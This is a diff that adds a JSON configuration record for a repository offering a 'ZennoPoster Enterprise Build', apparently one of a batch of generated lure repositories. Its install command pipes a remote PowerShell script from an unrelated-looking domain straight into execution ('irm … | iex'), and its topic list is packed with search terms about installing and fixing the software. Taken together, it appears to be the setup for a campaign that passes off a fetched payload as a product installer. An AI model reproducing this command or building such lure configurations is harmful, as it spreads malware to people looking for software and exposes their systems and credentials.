@@ -1,0 +1,28 @@
+{
+  "repo": "zennoposter-enterprise-build",
+  "product": "ZennoPoster Enterprise Build",
+  "kind": "dev",
+  "install_type": "download",
+  "download_url": "https://zennoposter.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "dev",
+  "topics": [
+    "zennoposter-build",
+    "zennoposter-quickstart",
+    "windows-11",
+    "zennoposter-setup-failed-fix",
+    "ide-extension",
+    "getting-started",
+    "productivity",
+    "local-server",
+    "debug-tools",
+    "install-guide",
+    "how-to-install-zennoposter",
+    "desktop-app",
+    "developer-tools",
+    "windows-10"
+  ]
+}
